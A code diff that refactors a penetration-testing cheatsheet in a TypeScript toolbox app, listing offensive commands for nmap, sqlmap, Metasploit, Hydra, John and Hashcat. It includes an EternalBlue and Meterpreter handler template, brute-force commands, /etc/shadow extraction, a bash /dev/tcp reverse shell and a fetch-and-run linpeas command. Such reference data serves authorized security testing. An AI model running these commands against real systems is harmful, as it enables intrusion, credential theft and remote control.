@@ -1,3 +1,5 @@
+import { externalCheatsheetFlag, localCheatsheetFlag } from '@/domains/toolbox/lib/capabilities';
+
 export const CHEATSHEET = [
   {
     tool: 'Nmap',
@@ -5,28 +7,28 @@ export const CHEATSHEET = [
       {
         name: 'Stealth / Speed',
         flags: [
-          { flag: '-T2', desc: 'Slow & Polite (Avoids IDS)' },
-          { flag: '-sS', desc: 'TCP SYN Scan (Half-open)' },
-          { flag: '-Pn', desc: 'No Ping (Skip host discovery)' }
-        ]
+          localCheatsheetFlag('-T2', 'Slow & Polite (Avoids IDS)', 'nmap'),
+          localCheatsheetFlag('-sS', 'TCP SYN Scan (Half-open)', 'nmap'),
+          localCheatsheetFlag('-Pn', 'No Ping (Skip host discovery)', 'nmap'),
+        ],
       },
       {
         name: 'Standard',
         flags: [
-          { flag: '-sV', desc: 'Version Detection' },
-          { flag: '-sC', desc: 'Default Scripts' },
-          { flag: '-O', desc: 'OS Detection' }
-        ]
+          localCheatsheetFlag('-sV', 'Version Detection', 'nmap'),
+          localCheatsheetFlag('-sC', 'Default Scripts', 'nmap'),
+          localCheatsheetFlag('-O', 'OS Detection', 'nmap'),
+        ],
       },
       {
         name: 'Aggressive',
         flags: [
-          { flag: '-A', desc: 'Aggressive (OS, Scripts, Traceroute)' },
-          { flag: '-T4', desc: 'Aggressive Timing' },
-          { flag: '-p-', desc: 'Scan All 65,535 Ports' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-A', 'Aggressive (OS, Scripts, Traceroute)', 'nmap'),
+          localCheatsheetFlag('-T4', 'Aggressive Timing', 'nmap'),
+          localCheatsheetFlag('-p-', 'Scan All 65,535 Ports', 'nmap'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Gobuster / FFUF',
@@ -34,20 +36,20 @@ export const CHEATSHEET = [
       {
         name: 'Directory Brute',
         flags: [
-          { flag: '-x php,txt,html', desc: 'Add extensions (Gobuster)' },
-          { flag: '-t 50', desc: 'Increase threads (Faster)' },
-          { flag: '-recursion', desc: 'Recursive scanning' }
-        ]
+          localCheatsheetFlag('-x php,txt,html', 'Add extensions (Gobuster)', 'gobuster'),
+          localCheatsheetFlag('-t 50', 'Increase threads (Faster)', 'gobuster'),
+          localCheatsheetFlag('-recursion', 'Recursive scanning', 'gobuster'),
+        ],
       },
       {
         name: 'FFUF Special',
         flags: [
-          { flag: '-mc 200,403', desc: 'Filter Match Codes' },
-          { flag: '-fc 404', desc: 'Filter Out 404s' },
-          { flag: '-H "Header: Value"', desc: 'Add Custom Header' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-mc 200,403', 'Filter Match Codes', 'ffuf'),
+          localCheatsheetFlag('-fc 404', 'Filter Out 404s', 'ffuf'),
+          localCheatsheetFlag('-H "Header: Value"', 'Add Custom Header', 'ffuf'),
+        ],
+      },
+    ],
   },
   {
     tool: 'SMB / AD',
@@ -55,18 +57,18 @@ export const CHEATSHEET = [
       {
         name: 'SMBClient',
         flags: [
-          { flag: '-N', desc: 'No Password (Anonymous)' },
-          { flag: '-L', desc: 'List Shares' }
-        ]
+          localCheatsheetFlag('-N', 'No Password (Anonymous)', 'smbclient'),
+          localCheatsheetFlag('-L', 'List Shares', 'smbclient'),
+        ],
       },
       {
         name: 'Enum4Linux',
         flags: [
-          { flag: '-a', desc: 'Do everything' },
-          { flag: '-U', desc: 'Get userlist' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-a', 'Do everything', 'enum4linux'),
+          localCheatsheetFlag('-U', 'Get userlist', 'enum4linux'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Curl (Data Extraction)',
@@ -74,20 +76,20 @@ export const CHEATSHEET = [
       {
         name: 'Headers & Cookies',
         flags: [
-          { flag: '-I', desc: 'Fetch Headers only' },
-          { flag: '-b "c=1"', desc: 'Send Cookie' },
-          { flag: '-H "Header: Val"', desc: 'Custom Header' }
-        ]
+          localCheatsheetFlag('-I', 'Fetch Headers only', 'curl'),
+          localCheatsheetFlag('-b "c=1"', 'Send Cookie', 'curl'),
+          localCheatsheetFlag('-H "Header: Val"', 'Custom Header', 'curl'),
+        ],
       },
       {
         name: 'Extraction & Burp',
         flags: [
-          { flag: '-L', desc: 'Follow Redirects' },
-          { flag: '-o out.txt', desc: 'Save Output to file' },
-          { flag: '-x http://127.0.0.1:8080', desc: 'Proxy to Burp' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-L', 'Follow Redirects', 'curl'),
+          localCheatsheetFlag('-o out.txt', 'Save Output to file', 'curl'),
+          localCheatsheetFlag('-x http://127.0.0.1:8080', 'Proxy to Burp', 'curl'),
+        ],
+      },
+    ],
   },
   {
     tool: 'External Advisors',
@@ -95,11 +97,11 @@ export const CHEATSHEET = [
       {
         name: 'Traffic Analysis',
         flags: [
-          { flag: 'Burp Suite', desc: 'Best for intercepting & modifying requests' },
-          { flag: 'Postman', desc: 'Great for API testing and automation' }
-        ]
-      }
-    ]
+          externalCheatsheetFlag('Burp Suite', 'Best for intercepting & modifying requests', 'Reference workflow; not executed by the local runtime.'),
+          externalCheatsheetFlag('Postman', 'Great for API testing and automation', 'Reference workflow; not executed by the local runtime.'),
+        ],
+      },
+    ],
   },
   {
     tool: 'DNS & SSL Recon',
@@ -107,19 +109,19 @@ export const CHEATSHEET = [
       {
         name: 'DNS Enumeration',
         flags: [
-          { flag: 'dnsrecon -d {t} -t std', desc: 'Standard DNS scan' },
-          { flag: 'dnsrecon -d {t} -t brt', desc: 'DNS Brute force' },
-          { flag: 'dnsrecon -d {t} -a', desc: 'AXFR Zone Transfer' }
-        ]
+          localCheatsheetFlag('dnsrecon -d {t} -t std', 'Standard DNS scan', 'dnsrecon'),
+          localCheatsheetFlag('dnsrecon -d {t} -t brt', 'DNS Brute force', 'dnsrecon'),
+          localCheatsheetFlag('dnsrecon -d {t} -a', 'AXFR Zone Transfer', 'dnsrecon'),
+        ],
       },
       {
         name: 'SSL/TLS Analysis',
         flags: [
-          { flag: 'sslscan {t}', desc: 'Full SSL/TLS scan' },
-          { flag: 'sslscan --certinfo {t}', desc: 'Show certificate info' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('sslscan {t}', 'Full SSL/TLS scan', 'sslscan'),
+          localCheatsheetFlag('sslscan --certinfo {t}', 'Show certificate info', 'sslscan'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Advanced Web',
@@ -127,15 +129,15 @@ export const CHEATSHEET = [
       {
         name: 'SQL Exploration',
         flags: [
-          { flag: 'sqlmap -u "url" --batch', desc: 'Automatic SQLi scan' },
-          { flag: 'sqlmap -u "url" --dbs', desc: 'List databases' },
-          { flag: 'sqlmap -u "url" -D db --tables', desc: 'List tables in DB' },
-          { flag: 'sqlmap -u "url" -D db -T tbl --dump', desc: 'Dump table data' },
-          { flag: 'sqlmap -u "url" --level=5 --risk=3', desc: 'Aggressive scanning' },
-          { flag: 'sqlmap -u "url" --os-shell', desc: 'Attempt OS shell' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('sqlmap -u "url" --batch', 'Automatic SQLi scan', 'sqlmap'),
+          localCheatsheetFlag('sqlmap -u "url" --dbs', 'List databases', 'sqlmap'),
+          localCheatsheetFlag('sqlmap -u "url" -D db --tables', 'List tables in DB', 'sqlmap'),
+          localCheatsheetFlag('sqlmap -u "url" -D db -T tbl --dump', 'Dump table data', 'sqlmap'),
+          localCheatsheetFlag('sqlmap -u "url" --level=5 --risk=3', 'Aggressive scanning', 'sqlmap'),
+          localCheatsheetFlag('sqlmap -u "url" --os-shell', 'Attempt OS shell', 'sqlmap'),
+        ],
+      },
+    ],
   },
   {
     tool: 'SearchSploit / Exploit-DB',
@@ -144,13 +146,13 @@ export const CHEATSHEET = [
       {
         name: 'Exploit Research',
         flags: [
-          { flag: 'searchsploit apache 2.4', desc: 'Search local Exploit-DB mirror for Apache 2.4 exploits' },
-          { flag: 'searchsploit smb', desc: 'Search SMB-related public exploits' },
-          { flag: 'searchsploit CVE-2024-0000', desc: 'Search by CVE identifier' },
-          { flag: 'searchsploit -m 00000', desc: 'Mirror a selected exploit locally' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('searchsploit apache 2.4', 'Search local Exploit-DB mirror for Apache 2.4 exploits', 'searchsploit'),
+          localCheatsheetFlag('searchsploit smb', 'Search SMB-related public exploits', 'searchsploit'),
+          localCheatsheetFlag('searchsploit CVE-2024-0000', 'Search by CVE identifier', 'searchsploit'),
+          localCheatsheetFlag('searchsploit -m 00000', 'Mirror a selected exploit locally', 'searchsploit'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Metasploit',
@@ -159,12 +161,12 @@ export const CHEATSHEET = [
       {
         name: 'Templates',
         flags: [
-          { flag: 'msfconsole -q -x "search type:exploit name:smb; exit"', desc: 'Search modules quickly' },
-          { flag: 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', desc: 'Meterpreter handler template' },
-          { flag: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"', desc: 'Windows SMB exploit template' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('msfconsole -q -x "search type:exploit name:smb; exit"', 'Search modules quickly', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
+          localCheatsheetFlag('msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', 'Meterpreter handler template', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
+          localCheatsheetFlag('msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"', 'Windows SMB exploit template', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Hydra',
@@ -172,24 +174,24 @@ export const CHEATSHEET = [
       {
         name: 'Brute Force',
         flags: [
-          { flag: '-l <user>', desc: 'Single username' },
-          { flag: '-L <file>', desc: 'Username list' },
-          { flag: '-p <pass>', desc: 'Single password' },
-          { flag: '-P <file>', desc: 'Password list' },
-          { flag: '-t 4', desc: 'Number of threads (default 16)' },
-          { flag: '-s <port>', desc: 'Custom port' },
-          { flag: '-V', desc: 'Verbose: show each attempt' }
-        ]
+          localCheatsheetFlag('-l <user>', 'Single username', 'hydra'),
+          localCheatsheetFlag('-L <file>', 'Username list', 'hydra'),
+          localCheatsheetFlag('-p <pass>', 'Single password', 'hydra'),
+          localCheatsheetFlag('-P <file>', 'Password list', 'hydra'),
+          localCheatsheetFlag('-t 4', 'Number of threads (default 16)', 'hydra'),
+          localCheatsheetFlag('-s <port>', 'Custom port', 'hydra'),
+          localCheatsheetFlag('-V', 'Verbose: show each attempt', 'hydra'),
+        ],
       },
       {
         name: 'Protocols',
         flags: [
-          { flag: 'hydra -l admin -P rockyou.txt ssh://TARGET', desc: 'SSH brute force' },
-          { flag: 'hydra -l admin -P rockyou.txt ftp://TARGET', desc: 'FTP brute force' },
-          { flag: 'hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', desc: 'HTTP form brute force' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('hydra -l admin -P rockyou.txt ssh://TARGET', 'SSH brute force', 'hydra'),
+          localCheatsheetFlag('hydra -l admin -P rockyou.txt ftp://TARGET', 'FTP brute force', 'hydra'),
+          localCheatsheetFlag('hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', 'HTTP form brute force', 'hydra'),
+        ],
+      },
+    ],
   },
   {
     tool: 'John the Ripper',
@@ -197,22 +199,22 @@ export const CHEATSHEET = [
       {
         name: 'Cracking',
         flags: [
-          { flag: '--wordlist=<file>', desc: 'Dictionary attack' },
-          { flag: '--format=<fmt>', desc: 'Force hash format (md5, sha1, ntlm...)' },
-          { flag: '--rules', desc: 'Apply word mangling rules' },
-          { flag: '--show', desc: 'Show cracked passwords' },
-          { flag: '--incremental', desc: 'Brute force mode' }
-        ]
+          localCheatsheetFlag('--wordlist=<file>', 'Dictionary attack', 'john'),
+          localCheatsheetFlag('--format=<fmt>', 'Force hash format (md5, sha1, ntlm...)', 'john'),
+          localCheatsheetFlag('--rules', 'Apply word mangling rules', 'john'),
+          localCheatsheetFlag('--show', 'Show cracked passwords', 'john'),
+          localCheatsheetFlag('--incremental', 'Brute force mode', 'john'),
+        ],
       },
       {
         name: 'Hash Extraction',
         flags: [
-          { flag: 'ssh2john id_rsa > hash.txt', desc: 'Extract hash from SSH key' },
-          { flag: 'zip2john file.zip > hash.txt', desc: 'Extract hash from ZIP' },
-          { flag: 'unshadow /etc/passwd /etc/shadow > combined.txt', desc: 'Combine passwd + shadow' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('ssh2john id_rsa > hash.txt', 'Extract hash from SSH key', 'john'),
+          localCheatsheetFlag('zip2john file.zip > hash.txt', 'Extract hash from ZIP', 'john'),
+          localCheatsheetFlag('unshadow /etc/passwd /etc/shadow > combined.txt', 'Combine passwd + shadow', 'john'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Hashcat',
@@ -220,31 +222,31 @@ export const CHEATSHEET = [
       {
         name: 'Attack Modes',
         flags: [
-          { flag: '-a 0', desc: 'Dictionary attack' },
-          { flag: '-a 3', desc: 'Brute-force / mask attack' },
-          { flag: '-a 6', desc: 'Hybrid wordlist + mask' }
-        ]
+          localCheatsheetFlag('-a 0', 'Dictionary attack', 'hashcat'),
+          localCheatsheetFlag('-a 3', 'Brute-force / mask attack', 'hashcat'),
+          localCheatsheetFlag('-a 6', 'Hybrid wordlist + mask', 'hashcat'),
+        ],
       },
       {
         name: 'Common Hash Types (-m)',
         flags: [
-          { flag: '-m 0', desc: 'MD5' },
-          { flag: '-m 100', desc: 'SHA1' },
-          { flag: '-m 1000', desc: 'NTLM (Windows)' },
-          { flag: '-m 1800', desc: 'sha512crypt ($6$) — Linux shadow' },
-          { flag: '-m 3200', desc: 'bcrypt ($2*$)' },
-          { flag: '-m 13100', desc: 'Kerberos TGS-REP (AS-REP roasting)' }
-        ]
+          localCheatsheetFlag('-m 0', 'MD5', 'hashcat'),
+          localCheatsheetFlag('-m 100', 'SHA1', 'hashcat'),
+          localCheatsheetFlag('-m 1000', 'NTLM (Windows)', 'hashcat'),
+          localCheatsheetFlag('-m 1800', 'sha512crypt ($6$) - Linux shadow', 'hashcat'),
+          localCheatsheetFlag('-m 3200', 'bcrypt ($2*$)', 'hashcat'),
+          localCheatsheetFlag('-m 13100', 'Kerberos TGS-REP (AS-REP roasting)', 'hashcat'),
+        ],
       },
       {
         name: 'Usage',
         flags: [
-          { flag: '--show', desc: 'Display already-cracked hashes' },
-          { flag: '-o out.txt', desc: 'Save cracked passwords to file' },
-          { flag: 'hashcat -m 0 hash.txt rockyou.txt', desc: 'MD5 dictionary crack' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('--show', 'Display already-cracked hashes', 'hashcat'),
+          localCheatsheetFlag('-o out.txt', 'Save cracked passwords to file', 'hashcat'),
+          localCheatsheetFlag('hashcat -m 0 hash.txt rockyou.txt', 'MD5 dictionary crack', 'hashcat'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Nikto',
@@ -252,16 +254,16 @@ export const CHEATSHEET = [
       {
         name: 'Scanning',
         flags: [
-          { flag: '-h <target>', desc: 'Target host or URL' },
-          { flag: '-p <port>', desc: 'Target port (default 80)' },
-          { flag: '-ssl', desc: 'Force SSL/HTTPS' },
-          { flag: '-o <file>', desc: 'Output file' },
-          { flag: '-Format <fmt>', desc: 'Output format: htm, csv, txt, xml' },
-          { flag: '-Tuning x', desc: 'Scan tuning: 1=Files, 2=Misc, 4=Inject, 9=SQL...' },
-          { flag: '-useragent <ua>', desc: 'Set custom User-Agent' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-h <target>', 'Target host or URL', 'nikto'),
+          localCheatsheetFlag('-p <port>', 'Target port (default 80)', 'nikto'),
+          localCheatsheetFlag('-ssl', 'Force SSL/HTTPS', 'nikto'),
+          localCheatsheetFlag('-o <file>', 'Output file', 'nikto'),
+          localCheatsheetFlag('-Format <fmt>', 'Output format: htm, csv, txt, xml', 'nikto'),
+          localCheatsheetFlag('-Tuning x', 'Scan tuning: 1=Files, 2=Misc, 4=Inject, 9=SQL...', 'nikto'),
+          localCheatsheetFlag('-useragent <ua>', 'Set custom User-Agent', 'nikto'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Feroxbuster',
@@ -269,17 +271,17 @@ export const CHEATSHEET = [
       {
         name: 'Directory Brute',
         flags: [
-          { flag: '-u <url>', desc: 'Target URL' },
-          { flag: '-w <wordlist>', desc: 'Wordlist path' },
-          { flag: '-x php,html,txt', desc: 'File extensions to fuzz' },
-          { flag: '--depth 2', desc: 'Recursion depth (0 = unlimited)' },
-          { flag: '--filter-status 404,403', desc: 'Hide responses by status code' },
-          { flag: '--no-recursion', desc: 'Disable recursive scanning' },
-          { flag: '-t 50', desc: 'Number of threads' },
-          { flag: '-o out.txt', desc: 'Save output to file' }
-        ]
-      }
-    ]
+          localCheatsheetFlag('-u <url>', 'Target URL', 'feroxbuster'),
+          localCheatsheetFlag('-w <wordlist>', 'Wordlist path', 'feroxbuster'),
+          localCheatsheetFlag('-x php,html,txt', 'File extensions to fuzz', 'feroxbuster'),
+          localCheatsheetFlag('--depth 2', 'Recursion depth (0 = unlimited)', 'feroxbuster'),
+          localCheatsheetFlag('--filter-status 404,403', 'Hide responses by status code', 'feroxbuster'),
+          localCheatsheetFlag('--no-recursion', 'Disable recursive scanning', 'feroxbuster'),
+          localCheatsheetFlag('-t 50', 'Number of threads', 'feroxbuster'),
+          localCheatsheetFlag('-o out.txt', 'Save output to file', 'feroxbuster'),
+        ],
+      },
+    ],
   },
   {
     tool: 'Privilege Escalation',
@@ -287,25 +289,25 @@ export const CHEATSHEET = [
       {
         name: 'Windows / AD',
         flags: [
-          { flag: 'whoami /priv', desc: 'Check Windows privileges' },
-          { flag: 'net user /domain', desc: 'List domain users' },
-          { flag: 'nltest /dclist:{domain}', desc: 'Enumerate domain controllers' },
-          { flag: 'bloodhound-python -d {domain} -u {user} -p {password} -gc {target} -c All', desc: 'Collect BloodHound data' }
-        ]
+          externalCheatsheetFlag('whoami /priv', 'Check Windows privileges', 'Run this on the target shell, not the local runtime.'),
+          externalCheatsheetFlag('net user /domain', 'List domain users', 'Run this on the target shell, not the local runtime.'),
+          externalCheatsheetFlag('nltest /dclist:{domain}', 'Enumerate domain controllers', 'Run this on the target shell, not the local runtime.'),
+          externalCheatsheetFlag('bloodhound-python -d {domain} -u {user} -p {password} -gc {target} -c All', 'Collect BloodHound data', 'Use this where BloodHound tooling is installed and properly scoped.'),
+        ],
       },
       {
         name: 'Post-Exploitation',
         flags: [
-          { flag: 'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"', desc: 'Bash reverse shell template' },
-          { flag: 'powershell -nop -c "<reverse shell here>"', desc: 'PowerShell reverse shell placeholder' },
-          { flag: 'curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', desc: 'Run LinPEAS' }
-        ]
-      }
-    ]
+          externalCheatsheetFlag('bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"', 'Bash reverse shell template', 'Run this on the target host or paste into a remote foothold workflow.'),
+          externalCheatsheetFlag('powershell -nop -c "<reverse shell here>"', 'PowerShell reverse shell placeholder', 'Run this on the target host or paste into a remote foothold workflow.'),
+          externalCheatsheetFlag('curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', 'Run LinPEAS', 'Usually executed on the target host after foothold.'),
+        ],
+      },
+    ],
   },
   {
     tool: 'GTFOBins / PrivEsc',
     link: 'https://gtfobins.github.io',
-    categories: []
-  }
+    categories: [],
+  },
 ];
